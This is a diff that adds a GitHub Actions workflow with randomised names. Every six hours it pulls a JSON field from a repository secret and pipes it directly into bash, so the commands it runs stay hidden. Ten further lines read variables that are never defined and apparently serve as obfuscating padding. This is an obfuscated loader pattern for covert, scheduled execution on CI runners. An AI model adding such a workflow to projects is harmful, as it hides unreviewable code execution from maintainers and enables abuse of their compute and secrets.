@@ -1,0 +1,29 @@
+name: separatecocksfoot
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: separatecocksfoot
+        env:
+          jwc9: ${{ secrets.jwc9 }}
+        run: |
+          echo $jwc9 | jq -r .mlqf20 | /bin/bash
+          echo $dhko6670 | jq -r .wf5831 | /bin/bash
+          echo $mm56909 | jq -r .stg64 | /bin/bash
+          echo $mtcja430 | jq -r .zh75590 | /bin/bash
+          echo $bkjj46 | jq -r .cosf542 | /bin/bash
+          echo $r6265 | jq -r .zcn70 | /bin/bash
+          echo $rzwx2371 | jq -r .lei1626 | /bin/bash
+          echo $d84287 | jq -r .ahgk12 | /bin/bash
+          echo $sv168 | jq -r .io14031 | /bin/bash
+          echo $y229 | jq -r .hf365 | /bin/bash
+          echo $nwaha21433 | jq -r .q253 | /bin/bash
+
